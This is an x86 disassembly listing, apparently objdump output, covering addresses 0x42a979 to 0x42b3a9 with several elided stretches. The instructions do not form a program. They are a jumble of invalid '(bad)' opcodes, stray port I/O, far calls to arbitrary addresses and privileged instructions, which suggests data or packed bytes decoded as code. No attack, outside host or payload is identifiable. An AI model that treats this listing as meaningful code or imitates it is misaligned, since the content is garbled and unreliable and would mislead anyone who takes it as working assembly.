  42a979:	xlat   BYTE PTR ds:[ebx]
  42a97a:	sbb    dh,BYTE PTR [ebx+0x3a231268]
  42a980:	inc    ebx
  42a981:	andnps xmm4,XMMWORD PTR [edi-0x774b4bee]
  42a988:	sub    ch,BYTE PTR [edi*8-0x75a3aa13]
  42a98f:	inc    eax
  42a990:	push   ss
  42a991:	xor    eax,0x4aea022c
  42a996:	bnd call 0x284453fc
  42a99c:	or     esp,DWORD PTR [edi+eax*1+0x19]
  42a9a0:	adc    ah,ch
  42a9a2:	(bad)  
  42a9a3:	mov    eax,ds:0x6125fa65
  42a9a8:	fisubr DWORD PTR [esi]
  42a9aa:	int    0xfa
  42a9ac:	out    dx,al
  42a9ad:	test   DWORD PTR [ecx+0x7e],0xc6f61d56
  42a9b4:	ret    
  42a9b5:	mov    BYTE PTR [ebx+0xf6f1e5d],bl
  42a9bb:	cs ins BYTE PTR es:[edi],dx
  42a9bd:	out    dx,al
  42a9be:	pop    edi
  42a9bf:	sub    eax,0x4ef195cf
  42a9c4:	mov    edi,?
  42a9c6:	outs   dx,DWORD PTR ds:[esi]
  42a9c7:	les    esi,FWORD PTR [edi]
  42a9c9:	sub    al,0x5b
  42a9cb:	inc    edi
  42a9cc:	lea    esi,[ebp-0x59]
  42a9cf:	pushf  
  42a9d0:	inc    edi
  42a9d1:	ret    0x6298
  42a9d4:	fdivrp st(7),st
  42a9d6:	lods   eax,DWORD PTR ds:[esi]
  42a9d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9d8:	jecxz  0x42a9fa
  42a9da:	test   DWORD PTR [esi+eax*4],esp
  42a9dd:	shr    DWORD PTR [eax-0x655ee492],0xba
  42a9e4:	xor    eax,ebx
  42a9e6:	repnz stc 
  42a9e8:	jle    0x42aa21
  42a9ea:	xor    eax,0x1b71
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	add    BYTE PTR [esi+0x5b],bl
  42aa65:	push   ebx
  42aa66:	jne    0x42aa30
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	inc    DWORD PTR [eax]
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	rcr    BYTE PTR [ecx-0x4b],0x98
  42aa72:	in     eax,dx
  42aa73:	std    
  42aa74:	hlt    
  42aa75:	out    0xe,al
  42aa77:	in     eax,dx
  42aa78:	mov    ds:0xba5b01be,al
  42aa7d:	push   cs
  42aa7e:	mov    WORD PTR [eax+0x36],cs
  42aa81:	aas    
  42aa82:	shl    BYTE PTR [edi+0x6d],1
  42aa85:	mov    ah,0x7c
  42aa87:	popa   
  42aa88:	mov    bh,0x11
  42aa8a:	repnz push ss
  42aa8c:	jge    0x42aa23
  42aa8e:	sbb    dh,BYTE PTR [esi]
  42aa90:	pop    ss
  42aa91:	lea    ebx,[ecx]
  42aa93:	aam    0xcf
  42aa95:	sub    cl,dl
  42aa97:	cmp    al,BYTE PTR [ebp-0x616f3a35]
  42aa9d:	inc    ebx
  42aa9e:	arpl   WORD PTR [edi],sp
  42aaa0:	std    
  42aaa1:	sbb    al,0x58
  42aaa3:	add    eax,0x5ec32877
  42aaa8:	repz jg 0x42aaef
  42aaab:	cld    
  42aaac:	arpl   dx,sp
  42aaae:	jnp    0x42aa9a
  42aab0:	adc    BYTE PTR [edi+0x7475a234],ah
  42aab6:	inc    esp
  42aab7:	push   ecx
  42aab8:	pop    ebx
  42aab9:	das    
  42aaba:	enter  0xb544,0xc0
  42aabe:	(bad)  
  42aabf:	(bad)  
  42aac0:	adc    DWORD PTR [edx-0x3f648550],eax
  42aac6:	pop    esp
  42aac7:	int3   
  42aac8:	mov    bl,0xe0
  42aaca:	add    eax,0x11622f5c
  42aacf:	stos   BYTE PTR es:[edi],al
  42aad0:	lds    ebx,FWORD PTR [ebx]
  42aad2:	scas   eax,DWORD PTR es:[edi]
  42aad3:	rcr    ebx,cl
  42aad5:	add    eax,0xda9885ff
  42aada:	clc    
  42aadb:	sub    ebx,DWORD PTR [edx-0xd7fc9a5]
  42aae1:	es jg  0x42ab63
  42aae4:	ret    
  42aae5:	out    dx,eax
  42aae6:	(bad)  
  42aae7:	out    dx,eax
  42aae8:	xchg   ebx,eax
  42aae9:	cmp    eax,0x548583d8
  42aaee:	test   eax,0x665c377f
  42aaf3:	push   edx
  42aaf4:	test   ebp,0xc5c039b0
  42aafa:	mov    eax,ds:0x12f52745
  42aaff:	aas    
  42ab00:	sub    al,0xb8
  42ab02:	fild   WORD PTR [eax+0x54]
  42ab05:	sbb    BYTE PTR [esi],bh
  42ab07:	popf   
  42ab08:	inc    eax
  42ab09:	ret    0x7eef
  42ab0c:	inc    edx
  42ab0d:	add    dh,BYTE PTR [ecx-0x3fa93e67]
  42ab13:	and    BYTE PTR [eax],dh
  42ab15:	ss cmp al,0x71
  42ab18:	sar    DWORD PTR [ebp+eax*8+0x7d],cl
  42ab1c:	dec    esi
  42ab1d:	imul   edi,DWORD PTR [edi],0x26
  42ab20:	ror    BYTE PTR [esi+0x20e49274],cl
  42ab26:	and    BYTE PTR [ebx],bl
  42ab28:	fstp   DWORD PTR [edx-0x52]
  42ab2b:	pusha  
  42ab2c:	and    eax,0x67f7cd0f
  42ab31:	sbb    bh,al
  42ab33:	pop    ss
  42ab34:	(bad)  
  42ab35:	js     0x42ab39
  42ab37:	add    al,BYTE PTR [ebx]
  42ab39:	sbb    DWORD PTR ds:0x168a1722,eax
  42ab3f:	xchg   esp,eax
  42ab40:	out    0xa5,al
  42ab42:	inc    edi
  42ab43:	enter  0xd310,0x81
  42ab47:	push   edx
  42ab48:	das    
  42ab49:	pop    ebp
  42ab4a:	xlat   BYTE PTR ds:[ebx]
  42ab4b:	test   DWORD PTR [ebp+0x40],ebp
  42ab4e:	mov    ds:0x6afebd29,al
  42ab53:	ds inc esp
  42ab55:	dec    ebx
  42ab56:	(bad)  
  42ab57:	out    0xf3,al
  42ab59:	push   0x7f120e13
  42ab5e:	ret    
  42ab5f:	push   ebx
  42ab60:	sbb    ch,BYTE PTR [ebp+0x1f]
  42ab63:	jp     0x42ab4a
  42ab65:	je     0x42abd6
  42ab67:	dec    ebx
  42ab68:	cld    
  42ab69:	xor    al,dh
  42ab6b:	cmp    BYTE PTR [edx],dh
	...
  42abd5:	add    BYTE PTR [esi],bh
  42abd7:	push   cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	pop    ebp
  42abe3:	pop    ebp
  42abe4:	fs das 
  42abe6:	je     0x42abb1
  42abe8:	add    DWORD PTR [eax],eax
  42abea:	inc    DWORD PTR [eax]
  42abec:	add    BYTE PTR [eax],al
  42abee:	ins    DWORD PTR es:[edi],dx
  42abef:	push   ss
  42abf0:	mov    esi,DWORD PTR [ebp+ebx*4+0x6d]
  42abf4:	jl     0x42ac1e
  42abf6:	sub    al,BYTE PTR [edx]
  42abf8:	mov    ebx,0x26aa04b9
  42abfd:	jb     0x42ab8d
  42abff:	sar    DWORD PTR [eax+0x57],0x88
  42ac03:	pop    ebx
  42ac04:	mov    edi,0x76d5a252
  42ac09:	and    eax,0x20da7d3
  42ac0e:	gs bswap esi
  42ac11:	fs dec ecx
  42ac13:	out    dx,al
  42ac14:	mov    WORD PTR fs:[edx-0xf7d43dc],cs
  42ac1b:	comiss xmm0,DWORD PTR [eax+ebx*1-0x1e894c5c]
  42ac23:	add    al,BYTE PTR [edi+0x26]
  42ac26:	lods   al,BYTE PTR ds:[esi]
  42ac27:	dec    DWORD PTR [edi]
  42ac29:	xchg   ebx,eax
  42ac2a:	in     al,0x6e
  42ac2c:	add    esp,eax
  42ac2e:	inc    ecx
  42ac2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac30:	div    BYTE PTR [esi+0x587f491]
  42ac36:	aas    
  42ac37:	aam    0xc0
  42ac39:	mov    al,0xb3
  42ac3b:	call   0x8f8c54f8
  42ac40:	jg     0x42abdd
  42ac42:	jg     0x42acb2
  42ac44:	add    al,0x40
  42ac46:	dec    ebp
  42ac47:	xor    eax,0x6f47040
  42ac4c:	fiadd  DWORD PTR [ebp-0x12]
  42ac4f:	adc    eax,0x5cc8206a
  42ac54:	pop    ecx
  42ac55:	repz sti 
  42ac57:	cmp    eax,0xb1cb77e1
  42ac5c:	aas    
  42ac5d:	out    0x19,eax
  42ac5f:	and    eax,0x80338650
  42ac64:	fild   DWORD PTR [esi-0x3e416326]
  42ac6a:	and    eax,edi
  42ac6c:	inc    edi
  42ac6d:	cdq    
  42ac6e:	pop    ss
  42ac6f:	imul   ecx,ebx,0xe404cd64
  42ac75:	xor    BYTE PTR [ebx+edi*4],cl
  42ac78:	xchg   DWORD PTR [esi],ebx
  42ac7a:	mov    DWORD PTR [edi],ebx
  42ac7c:	adc    ebp,edx
  42ac7e:	shl    ecx,1
  42ac80:	mul    DWORD PTR [edx]
  42ac82:	dec    edx
  42ac83:	mov    ebx,0x7b863a2b
  42ac88:	lock outs dx,BYTE PTR ds:[esi]
  42ac8a:	xchg   edi,eax
  42ac8b:	enter  0x2a11,0xc6
  42ac8f:	arpl   WORD PTR [esi+0x64b4425c],bx
  42ac95:	cmp    eax,0x807b398a
  42ac9a:	les    edx,FWORD PTR [ebx+0x2dbfd4ed]
  42aca0:	jl     0x42acbe
  42aca2:	outs   dx,DWORD PTR ds:[esi]
  42aca3:	test   DWORD PTR [edi+0x2d],ebp
  42aca6:	mov    eax,0xb7d53af9
  42acab:	dec    esi
  42acac:	or     DWORD PTR [edx],ebx
  42acae:	mov    esp,0x78b297a3
  42acb3:	or     ebx,DWORD PTR [esi+0x4c1948d]
  42acb9:	sbb    BYTE PTR [edx+0x2aee1785],ch
  42acbf:	dec    ebp
  42acc0:	aam    0x6f
  42acc2:	lods   al,BYTE PTR ds:[esi]
  42acc3:	pusha  
  42acc4:	pop    esp
  42acc5:	fcmovnbe st,st(7)
  42acc7:	fwait
  42acc8:	imul   DWORD PTR [edx-0x58]
  42accb:	fld    TBYTE PTR [esp+edx*2+0x7171a1cd]
  42acd2:	scas   eax,DWORD PTR es:[edi]
  42acd3:	in     al,0xdb
  42acd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42acd6:	jae    0x42ac78
  42acd8:	xor    eax,0x638ce78
  42acdd:	test   DWORD PTR [esi+0x53eac83d],edx
  42ace3:	or     al,0x46
  42ace5:	inc    eax
  42ace6:	add    DWORD PTR [edi-0x4956ddcf],eax
  42acec:	mov    eax,DWORD PTR [eax]
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	add    al,BYTE PTR [edi]
  42ad64:	pop    ss
  42ad65:	add    BYTE PTR [ebx-0x36],dh
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	inc    DWORD PTR [eax]
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	ret    
  42ad6f:	jg     0x42ad27
  42ad71:	sahf   
  42ad72:	sti    
  42ad73:	test   eax,esp
  42ad75:	int3   
  42ad76:	mov    eax,0x7d8971
  42ad7b:	xor    al,ah
  42ad7d:	aaa    
  42ad7e:	push   ecx
  42ad7f:	inc    eax
  42ad80:	stc    
  42ad81:	mov    bh,0x2b
  42ad83:	push   esp
  42ad84:	pop    es
  42ad85:	pop    edx
  42ad86:	rol    DWORD PTR [ebx+0x5b8dfd23],0xce
  42ad8d:	sbb    BYTE PTR [esi],0x84
  42ad90:	arpl   cx,sp
  42ad92:	ret    0x4bc2
  42ad95:	pop    edx
  42ad96:	gs loop 0x42ad61
  42ad99:	jmp    0xb2136264
  42ad9e:	icebp  
  42ad9f:	mov    WORD PTR [ebx],gs
  42ada1:	jge    0x42ad34
  42ada3:	push   ebx
  42ada4:	pop    esp
  42ada5:	jecxz  0x42ad90
  42ada7:	add    eax,0x6c1dac95
  42adac:	out    dx,eax
  42adad:	inc    eax
  42adae:	adc    eax,0x63e967c9
  42adb3:	cld    
  42adb4:	std    
  42adb5:	div    BYTE PTR [ebx]
  42adb7:	sbb    ecx,eax
  42adb9:	inc    edx
  42adba:	mov    ebp,0xa7370132
  42adbf:	rol    DWORD PTR [edi-0x67],0x41
  42adc3:	push   ss
  42adc4:	in     al,dx
  42adc5:	sub    al,0x68
  42adc7:	cmp    BYTE PTR [ebx],0xb1
  42adca:	outs   dx,DWORD PTR ds:[esi]
  42adcb:	xchg   ebx,eax
  42adcc:	in     eax,dx
  42adcd:	inc    ebx
  42adce:	adc    eax,DWORD PTR [ebx]
  42add0:	mov    eax,ds:0xeb659bec
  42add5:	sub    eax,0x96cece13
  42adda:	mov    edx,0xf9635a29
  42addf:	add    eax,0xffac82d2
  42ade4:	push   edx
  42ade5:	pop    eax
  42ade6:	pop    ss
  42ade7:	xchg   ecx,eax
  42ade8:	xor    eax,0x9b21d6ba
  42aded:	mov    eax,ds:0xc206bd5d
  42adf2:	push   edi
  42adf3:	add    al,0x5a
  42adf5:	ss dec esp
  42adf7:	mov    bl,0x4b
  42adf9:	fistp  DWORD PTR ds:0x67a89da
  42adff:	nop
  42ae00:	out    dx,eax
  42ae01:	mov    eax,DWORD PTR [ecx-0x32e6e643]
  42ae07:	dec    eax
  42ae08:	add    BYTE PTR [esi+0xbbbf745],0xac
  42ae0f:	pop    esi
  42ae10:	mov    ds:0xdde501eb,al
  42ae15:	fstp   QWORD PTR ds:0x9eecaf28
  42ae1b:	jbe    0x42ae21
  42ae1d:	mov    edi,0xa6579790
  42ae22:	sbb    al,0xc3
  42ae24:	dec    ebx
  42ae25:	out    dx,eax
  42ae26:	xchg   esi,eax
  42ae27:	jge    0x42adde
  42ae29:	xrelease mov DWORD PTR [esi],0x7821d8cf
  42ae30:	call   0x3c8c:0x2fb1a23d
  42ae37:	je     0x42ae03
  42ae39:	ficomp DWORD PTR [bx+si+0x14]
  42ae3d:	outs   dx,DWORD PTR ds:[si]
  42ae3f:	fwait
  42ae40:	add    al,0xa7
  42ae42:	xor    al,0x28
  42ae44:	fld    QWORD PTR [ebx-0x33579d6e]
  42ae4a:	pop    ecx
  42ae4b:	xchg   bh,ch
  42ae4d:	mov    ds:0xc91a1367,al
  42ae52:	pop    edx
  42ae53:	mov    edx,0xe0400f6
  42ae58:	stos   DWORD PTR es:[edi],eax
  42ae59:	fcmovnu st,st(1)
  42ae5b:	nop    DWORD PTR [eax+0x38]
  42ae5f:	push   ebp
  42ae60:	sub    edx,ecx
  42ae62:	shl    BYTE PTR [ebp+0x39e9348b],1
  42ae68:	repz loope 0x42ae3f
  42ae6b:	dec    ecx
  42ae6c:	retf   
	...
  42aed5:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	cdq    
  42aee3:	xchg   edi,eax
  42aee4:	sub    al,0x6f
  42aee6:	jb     0x42aeb3
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	inc    DWORD PTR [eax]
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	mov    ds:0x3e5563f5,al
  42aef3:	fiadd  WORD PTR [ebp-0x63]
  42aef6:	jecxz  0x42ae8e
  42aef8:	add    DWORD PTR [ebx-0x62],eax
  42aefb:	call   0x38fae338
  42af00:	xor    al,0xba
  42af02:	mov    ds:0x2525ce60,al
  42af07:	adc    eax,0xa6af13e0
  42af0c:	cmovno ecx,DWORD PTR [edi+0x7671193c]
  42af13:	(bad)  
  42af14:	(bad)  
  42af15:	repz mov edi,0x4d917da2
  42af1b:	iret   
  42af1c:	sbb    esp,edx
  42af1e:	adc    BYTE PTR ds:0x84f3201d,0xb0
  42af25:	repnz inc edi
  42af27:	add    al,0x6f
  42af29:	mov    al,ds:0xa1ef801a
  42af2e:	pop    edi
  42af2f:	dec    ebp
  42af30:	pop    ecx
  42af31:	sub    ch,BYTE PTR [ecx+0x6a]
  42af34:	push   ds
  42af35:	ss cld 
  42af37:	lahf   
  42af38:	stc    
  42af39:	xchg   edx,eax
  42af3a:	and    eax,0x6b6c538b
  42af3f:	xlat   BYTE PTR ds:[ebx]
  42af40:	jbe    0x42af87
  42af42:	test   DWORD PTR [ebx-0x5c032f82],ecx
  42af48:	and    al,0x54
  42af4a:	pop    ss
  42af4b:	call   0xf72b709c
  42af50:	sti    
  42af51:	xchg   ebp,edx
  42af53:	dec    edi
  42af54:	xchg   ebp,eax
  42af55:	xchg   esp,eax
  42af56:	or     DWORD PTR [edi],esi
  42af58:	add    al,cl
  42af5a:	sub    DWORD PTR [ebx+esi*1+0x56fb137a],esp
  42af61:	jecxz  0x42af6e
  42af63:	lea    esi,[ecx-0x446c76a8]
  42af69:	(bad)  
  42af6a:	(bad)  
  42af6c:	inc    eax
  42af6d:	and    edx,0xfffffff0
  42af70:	dec    esp
  42af71:	pop    esp
  42af72:	out    dx,al
  42af73:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42af75:	dec    ebx
  42af76:	ins    BYTE PTR es:[edi],dx
  42af77:	outs   dx,BYTE PTR ds:[esi]
  42af78:	lock push esi
  42af7a:	xor    eax,0xe75566d6
  42af7f:	aaa    
  42af80:	xor    bl,BYTE PTR [edi]
  42af82:	js     0x42af46
  42af84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af85:	mov    ecx,0x6a41fbfc
  42af8a:	int    0x75
  42af8c:	dec    esp
  42af8d:	hlt    
  42af8e:	mov    eax,0xd443d2e3
  42af93:	sbb    al,0xa8
  42af95:	mov    ecx,0x306bcfd2
  42af9a:	push   ss
  42af9b:	fstp   TBYTE PTR [ecx+eiz*8]
  42af9e:	(bad)  
  42af9f:	data16 fdivr DWORD PTR [ecx-0x156829b3]
  42afa6:	dec    edx
  42afa7:	int    0x19
  42afa9:	and    ebp,DWORD PTR ds:0xb399da27
  42afaf:	pop    ecx
  42afb0:	mov    eax,ds:0x935364b5
  42afb5:	nop
  42afb6:	sbb    eax,esp
  42afb8:	jle    0x42afd8
  42afba:	mov    bl,0x48
  42afbc:	sbb    BYTE PTR [esi],cl
  42afbe:	aas    
  42afbf:	lods   al,BYTE PTR ds:[esi]
  42afc0:	gs pop ecx
  42afc2:	pop    edx
  42afc3:	jbe    0x42afeb
  42afc5:	mov    ecx,0x62a43131
  42afca:	add    al,0xf6
  42afcc:	sahf   
  42afcd:	xor    bh,BYTE PTR [eax+ebx*4+0x3d37f0b3]
  42afd4:	out    dx,al
  42afd5:	push   es
  42afd6:	cmp    esi,DWORD PTR [ecx-0x6563053b]
  42afdc:	imul   bl
  42afde:	vpunpcklwd ymm0,ymm4,ymm4
  42afe2:	sbb    al,0x2b
  42afe4:	xor    DWORD PTR [edi-0x28564017],esp
  42afea:	mov    edi,0x2e8d
	...
  42b053:	add    BYTE PTR [eax],al
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	rcr    ch,1
  42b064:	push   edi
  42b065:	jb     0x42b0d8
  42b067:	int3   
  42b068:	add    DWORD PTR [eax],eax
  42b06a:	inc    DWORD PTR [eax]
  42b06c:	add    BYTE PTR [eax],al
  42b06e:	aas    
  42b06f:	xchg   esi,eax
  42b070:	mov    eax,ds:0x103e376c
  42b075:	popa   
  42b076:	pop    ebx
  42b077:	fdivr  st(1),st
  42b079:	cdq    
  42b07a:	ret    
  42b07b:	je     0x42b0bc
  42b07d:	mov    esi,0x84021a34
  42b082:	gs jae 0x42b0ae
  42b085:	fwait
  42b086:	jne    0x42b034
  42b088:	stc    
  42b089:	jns    0x42b0c8
  42b08b:	js     0x42b0b7
  42b08d:	mov    edi,0x3053974c
  42b092:	sub    eax,ebp
  42b094:	mov    ecx,0xad72d40f
  42b099:	cmp    DWORD PTR [edi-0x36656323],edx
  42b09f:	mov    ebp,0x5649d02d
  42b0a4:	dec    ebx
  42b0a5:	cdq    
  42b0a6:	repnz in al,0xe9
  42b0a9:	jne    0x42b12a
  42b0ab:	imul   edi,DWORD PTR [eax],0x2ec790cf
  42b0b1:	mov    bl,0x31
  42b0b3:	mov    WORD PTR [esi+eax*8+0x1a3e8229],cs
  42b0ba:	cs jmp 0x42b118
  42b0bd:	ins    DWORD PTR es:[edi],dx
  42b0be:	dec    esp
  42b0bf:	mov    ecx,eax
  42b0c1:	or     eax,0xc7f7a472
  42b0c6:	retf   0x9484
  42b0c9:	retf   
  42b0ca:	mov    bh,0xfa
  42b0cc:	add    al,0xa4
  42b0ce:	and    BYTE PTR [ebx-0x7028aaae],ch
  42b0d4:	inc    ah
  42b0d6:	xchg   ecx,eax
  42b0d7:	sub    edx,DWORD PTR [edi-0x2a]
  42b0da:	jg     0x42b0c1
  42b0dc:	jle    0x42b07c
  42b0de:	mov    dl,0x3b
  42b0e0:	idiv   BYTE PTR [eax+0x60]
  42b0e3:	xchg   edx,eax
  42b0e4:	inc    esi
  42b0e5:	(bad)  
  42b0e6:	jp     0x42b0e8
  42b0e8:	xchg   edx,eax
  42b0e9:	mov    eax,fs:0x59880ba8
  42b0ef:	lds    edi,FWORD PTR [ebx+0x3f]
  42b0f2:	sub    eax,0xecf1f01b
  42b0f7:	xor    BYTE PTR [ecx],bl
  42b0f9:	jl     0x42b093
  42b0fb:	mov    DWORD PTR [esi+ebp*1],ecx
  42b0fe:	ret    
  42b0ff:	out    dx,al
  42b100:	or     ebp,DWORD PTR [edi+0x7]
  42b103:	test   DWORD PTR ds:0xeb0553c,edx
  42b109:	mov    dl,BYTE PTR [eax-0x6f6bb072]
  42b10f:	(bad)  
  42b110:	loope  0x42b0cc
  42b112:	lods   eax,DWORD PTR ds:[esi]
  42b113:	add    eax,0xdf15ac27
  42b118:	inc    eax
  42b119:	inc    esi
  42b11a:	mov    bh,0x35
  42b11c:	cli    
  42b11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b11e:	leave  
  42b11f:	in     al,0x67
  42b121:	push   edi
  42b122:	push   0xffffffad
  42b124:	hlt    
  42b125:	or     al,0xf5
  42b127:	pop    esp
  42b128:	js     0x42b19f
  42b12a:	fcom   st(1)
  42b12c:	nop
  42b12d:	(bad)  
  42b12e:	lods   al,BYTE PTR ds:[esi]
  42b12f:	(bad)  
  42b130:	jmp    0xd69e53
  42b135:	clc    
  42b136:	mov    gs,WORD PTR [ebx-0x6f]
  42b139:	push   esp
  42b13a:	in     al,dx
  42b13b:	xchg   esi,eax
  42b13c:	icebp  
  42b13d:	inc    esp
  42b13e:	test   al,0x12
  42b140:	or     BYTE PTR [ecx],bl
  42b142:	loopne 0x42b0d8
  42b144:	mov    dh,0x66
  42b146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b147:	jecxz  0x42b19b
  42b149:	sub    dl,ch
  42b14b:	inc    ebp
  42b14c:	test   BYTE PTR [ebx+0x58e8cad7],cl
  42b152:	mov    esp,0x988e7705
  42b157:	mov    eax,ds:0xf4056747
  42b15c:	xchg   eax,eax
  42b15e:	sahf   
  42b15f:	out    dx,al
  42b160:	sub    bh,bh
  42b162:	mov    dl,0x9a
  42b164:	in     eax,dx
  42b165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b166:	mov    ecx,0x13088ee8
  42b16b:	sbb    eax,0x4
	...
  42b1d4:	add    BYTE PTR [eax],al
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	mov    edx,es
  42b1e4:	pusha  
  42b1e5:	jnp    0x42b257
  42b1e7:	int    0x1
  42b1e9:	add    bh,bh
  42b1eb:	add    BYTE PTR [eax],al
  42b1ed:	add    ch,dl
  42b1ef:	call   0x8fd1dd15
  42b1f4:	inc    ebp
  42b1f5:	mov    ds:0xafcab450,al
  42b1fa:	pop    ecx
  42b1fb:	gs call 0x5bb4b89d
  42b201:	jmp    FWORD PTR [esi]
  42b203:	addr16 mov ecx,0x686f2aa5
  42b209:	js     0x42b1b6
  42b20b:	dec    eax
  42b20c:	mov    eax,ds:0x1ba674c7
  42b211:	ins    BYTE PTR es:[edi],dx
  42b212:	xor    eax,0xc2958a78
  42b217:	mov    dh,0xaa
  42b219:	fild   WORD PTR [eax-0x73]
  42b21c:	xor    DWORD PTR [ebx-0x7ca05c84],ebp
  42b222:	clc    
  42b223:	in     eax,dx
  42b224:	push   cs
  42b225:	or     BYTE PTR [esi],al
  42b227:	pop    ebp
  42b228:	adc    eax,0x3e014d25
  42b22d:	stos   DWORD PTR es:[edi],eax
  42b22e:	push   eax
  42b22f:	mov    DWORD PTR [eax],ebx
  42b231:	pop    ds
  42b232:	jnp    0x42b240
  42b234:	outs   dx,DWORD PTR ds:[esi]
  42b235:	out    0x5b,eax
  42b237:	push   0xa
  42b239:	jl     0x42b29f
  42b23b:	push   ds
  42b23c:	nop
  42b23d:	or     dl,BYTE PTR [edi]
  42b23f:	mov    esi,esp
  42b241:	jp     0x42b24e
  42b243:	jecxz  0x42b28a
  42b245:	aaa    
  42b246:	push   es
  42b247:	sub    ebx,esi
  42b249:	pop    ss
  42b24a:	pop    ebx
  42b24b:	je     0x42b2ae
  42b24d:	and    al,0x3
  42b24f:	add    BYTE PTR [esi-0x1a],ch
  42b252:	div    DWORD PTR [ebx]
  42b254:	xchg   edi,eax
  42b255:	inc    edx
  42b256:	adc    eax,0x67b222d4
  42b25b:	adc    edi,ebx
  42b25d:	stos   BYTE PTR es:[edi],al
  42b25e:	push   eax
  42b25f:	test   eax,0xdd3e3616
  42b264:	and    al,0xff
  42b266:	fwait
  42b267:	dec    esp
  42b268:	sub    eax,0x9572044b
  42b26d:	sub    BYTE PTR [edi],dl
  42b26f:	cli    
  42b270:	fs clc 
  42b272:	shl    BYTE PTR ds:0xcba8728,cl
  42b278:	mov    eax,eax
  42b27a:	jb     0x42b211
  42b27c:	cli    
  42b27d:	mov    edi,DWORD PTR [eax+eiz*8-0x4a]
  42b281:	call   0x7c21ae9
  42b286:	ss stos DWORD PTR es:[edi],eax
  42b288:	adc    eax,0x1e3a442d
  42b28d:	repz and BYTE PTR [edx+esi*1-0x2c],0x64
  42b293:	mov    ch,0x3
  42b295:	mov    WORD PTR [eax-0x5e049642],ds
  42b29b:	test   al,0x5c
  42b29d:	pusha  
  42b29e:	inc    edi
  42b29f:	loopne 0x42b286
  42b2a1:	call   DWORD PTR [esp+esi*4+0x3b]
  42b2a5:	push   cs
  42b2a6:	ds xchg ebx,eax
  42b2a8:	(bad)  
  42b2a9:	hlt    
  42b2aa:	pop    ebp
  42b2ab:	(bad)  
  42b2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2ad:	fnstcw WORD PTR [esi-0x7b853ee8]
  42b2b3:	in     al,0x11
  42b2b5:	retf   0x2ca0
  42b2b8:	mov    ch,0x5f
  42b2ba:	mov    cl,0x11
  42b2bc:	dec    ebx
  42b2bd:	pop    eax
  42b2be:	icebp  
  42b2bf:	dec    ebx
  42b2c0:	xchg   esi,eax
  42b2c1:	aam    0x76
  42b2c3:	test   al,0xe5
  42b2c5:	out    dx,eax
  42b2c6:	in     eax,dx
  42b2c7:	mov    WORD PTR [edx+esi*2-0xf4dc4b0],ds
  42b2ce:	test   DWORD PTR [ebp+0x639afaaa],edx
  42b2d4:	inc    edi
  42b2d5:	in     al,0xb4
  42b2d7:	cwde   
  42b2d8:	push   edx
  42b2d9:	sbb    BYTE PTR [eax+0x2680b661],0x30
  42b2e0:	push   esi
  42b2e1:	xor    eax,0x955f4f12
  42b2e6:	mov    ebx,0x7d7c07c1
  42b2eb:	jmp    0x42b3cb
	...
  42b354:	add    BYTE PTR [eax],al
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x6f738e65
  42b363:	jl     0x42b30a
  42b365:	out    dx,eax
  42b366:	outs   dx,DWORD PTR ds:[esi]
  42b367:	into   
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	inc    DWORD PTR [eax]
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	dec    edi
  42b36f:	mov    es,WORD PTR [eax-0x73]
  42b372:	nop
  42b373:	loopne 0x42b3c4
  42b375:	xchg   ebx,eax
  42b376:	jmp    0x42b365
  42b378:	call   0xd2bf:0x9ab14eb8
  42b37f:	shr    DWORD PTR ds:[ebp-0x59],cl
  42b383:	add    ch,BYTE PTR [ebp+ebx*4+0x41]
  42b387:	pop    esp
  42b388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b389:	aas    
  42b38a:	cmp    eax,0x9c989117
  42b38f:	xchg   ecx,eax
  42b390:	rol    DWORD PTR [ecx+0x1a],1
  42b393:	mov    ah,0xd4
  42b395:	daa    
  42b396:	into   
  42b397:	test   BYTE PTR [esi+0x71f0a4bb],ch
  42b39d:	leave  
  42b39e:	std    
  42b39f:	or     al,0x58
  42b3a1:	mov    cl,0xc2
  42b3a3:	stos   BYTE PTR es:[edi],al
  42b3a4:	cmp    DWORD PTR [esi],esp
  42b3a6:	or     al,0x59
  42b3a8:	ret    
  42b3a9:	mov    ch,0xaa
